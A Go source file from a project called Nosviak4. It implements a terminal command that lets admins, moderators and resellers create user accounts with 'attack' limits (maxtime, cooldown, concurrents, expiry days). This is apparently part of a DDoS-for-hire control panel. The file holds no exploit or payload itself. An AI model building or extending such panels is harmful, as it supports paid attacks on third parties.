package subcommands

import (
	"Nosviak4/modules/gologr"
	"Nosviak4/source"
	"Nosviak4/source/functions"
	"Nosviak4/source/database"
	"Nosviak4/source/masters/commands"
	reg "Nosviak4/source/masters/commands/commands"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal/interactions"
	"fmt"
	"time"
)

var UsersNew = reg.Users.NewCommand(&commands.Command{
	Aliases:     []string{"new", "create"},
	Description: "create a new user",
	Permissions: []string{interactions.ADMIN, interactions.MOD, interactions.RESELLER},
	CommandFunc: func(ac *commands.ArgContext, s *sessions.Session) error {
		user, err := database.DB.GetUser(fmt.Sprint(ac.Args[0].Values[0].Literal))
		if err == nil && user != nil {
			return s.ExecuteBranding(map[string]any{"exists": user.User()}, "commands", "users", "new", "user_exists.tfx")
		}

		user = new(database.User)

		// Attack information
		user.API = source.OPTIONS.Bool("default_user", "api")
		user.Conns = ac.Args[4].Values[0].Literal.(int)
		user.Theme = source.OPTIONS.String("default_theme")
		user.Expiry = time.Unix(int64(ac.Args[5].Values[0].Literal.(int)*86400), 0).Unix()
		user.Maxtime = ac.Args[2].Values[0].Literal.(int)
		user.Cooldown = ac.Args[3].Values[0].Literal.(int)

		// Commits the main authentication details
		user.Username = fmt.Sprint(ac.Args[0].Values[0].Literal)
		user.Password = []byte(fmt.Sprint(ac.Args[1].Values[0].Literal))
		if len(user.Username) < source.OPTIONS.Ints("minimum_user_length") || len(user.Username) > source.OPTIONS.Ints("maximum_user_length") {
			return s.ExecuteBranding(make(map[string]any), "commands", "users", "invalid_username.tfx")
		}

		if len(user.Password) < source.OPTIONS.Ints("minimum_password_length") || len(user.Password) > source.OPTIONS.Ints("maximum_password_length") {
			return s.ExecuteBranding(make(map[string]any), "commands", "users", "invalid_password.tfx")
		}

		// Checks the resellers maxtime resource
		if functions.CanAccessThemPermissions(s.User, "!admin", "!mod", "reseller") && s.User.Maxtime < user.Maxtime {
			return s.ExecuteBranding(map[string]any{"target": user.User(), "value": user.Maxtime, "field": "maxtime"}, "commands", "users", "above_reseller_tunable.tfx")
		}

		// Checks the resellers conns resource
		if functions.CanAccessThemPermissions(s.User, "!admin", "!mod", "reseller") && s.User.Conns < user.Conns {
			return s.ExecuteBranding(map[string]any{"target": user.User(), "value": user.Conns, "field": "conns"}, "commands", "users", "above_reseller_tunable.tfx")
		}

		// Checks the resellers cooldown resource
		if functions.CanAccessThemPermissions(s.User, "!admin", "!mod", "reseller") && s.User.Cooldown > user.Cooldown {
			return s.ExecuteBranding(map[string]any{"target": user.User(), "value": user.Cooldown, "field": "cooldown"}, "commands", "users", "above_reseller_tunable.tfx")
		}

		if err := database.DB.NewUser(user, s.User, commands.Conn.SendWebhook); err != nil {
			source.LOGGER.AggregateTerminal().WriteLog(gologr.ERROR, "Error when trying to create %s: %v", user.Username, err)
			return s.ExecuteBranding(map[string]any{"err": err.Error()}, "commands", "users", "new", "error_occurred.tfx")
		}

		reg.UsersLog.WriteLog("%s has created %s", s.User.Username, user.Username)
		return s.ExecuteBranding(map[string]any{"created": user.User()}, "commands", "users", "new", "success.tfx")
	},

	/* implements all the arguments for the command itself */
	Args: []*commands.Arg{{
		Type: commands.STRING,
		Name: "username",
		NotProvided: func(s *sessions.Session, _ []string) (string, error) {
			read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "username.tfx"), s.Reader.Context)
			content, err := read.ReadLine()
			if err != nil {
				return "", err
			}

			if len(content) == 0 {
				return "", fmt.Errorf("not allowed")
			}

			return string(content), nil
		},
	},
		{
			Type: commands.STRING,
			Name: "password",
			NotProvided: func(s *sessions.Session, _ []string) (string, error) {
				read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "password.tfx"), s.Reader.Context).ChangeMaxLen(source.OPTIONS.Ints("maximum_password_length")).ChangeMinLen(source.OPTIONS.Ints("minimum_password_length"))
				content, err := read.ReadLine()
				if err != nil {
					return "", err
				}

				if len(content) == 0 {
					return "", fmt.Errorf("not allowed")
				}

				return string(content), nil
			},
		},
		{
			Type: commands.NUMBER,
			Name: "maxtime",
			NotProvided: func(s *sessions.Session, _ []string) (string, error) {
				read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "maxtime.tfx"), s.Reader.Context)
				content, err := read.ReadLine()
				if err != nil {
					return "", err
				}

				if len(content) == 0 {
					return "", fmt.Errorf("not allowed")
				}

				return string(content), nil
			},
		},
		{
			Type: commands.NUMBER,
			Name: "cooldown",
			NotProvided: func(s *sessions.Session, _ []string) (string, error) {
				read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "cooldown.tfx"), s.Reader.Context)
				content, err := read.ReadLine()
				if err != nil {
					return "", err
				}

				if len(content) == 0 {
					return "", fmt.Errorf("not allowed")
				}

				return string(content), nil
			},
		},
		{
			Type: commands.NUMBER,
			Name: "concurrents",
			NotProvided: func(s *sessions.Session, _ []string) (string, error) {
				read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "concurrents.tfx"), s.Reader.Context)
				content, err := read.ReadLine()
				if err != nil {
					return "", err
				}

				if len(content) == 0 {
					return "", fmt.Errorf("not allowed")
				}

				return string(content), nil
			},
		},
		{
			Type: commands.NUMBER,
			Name: "days",
			NotProvided: func(s *sessions.Session, _ []string) (string, error) {
				read := s.Terminal.NewReadWithContext(s.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "users", "new", "days.tfx"), s.Reader.Context)
				content, err := read.ReadLine()
				if err != nil {
					return "", err
				}

				if len(content) == 0 {
					return "", fmt.Errorf("not allowed")
				}

				return string(content), nil
			},
		},
	},
})
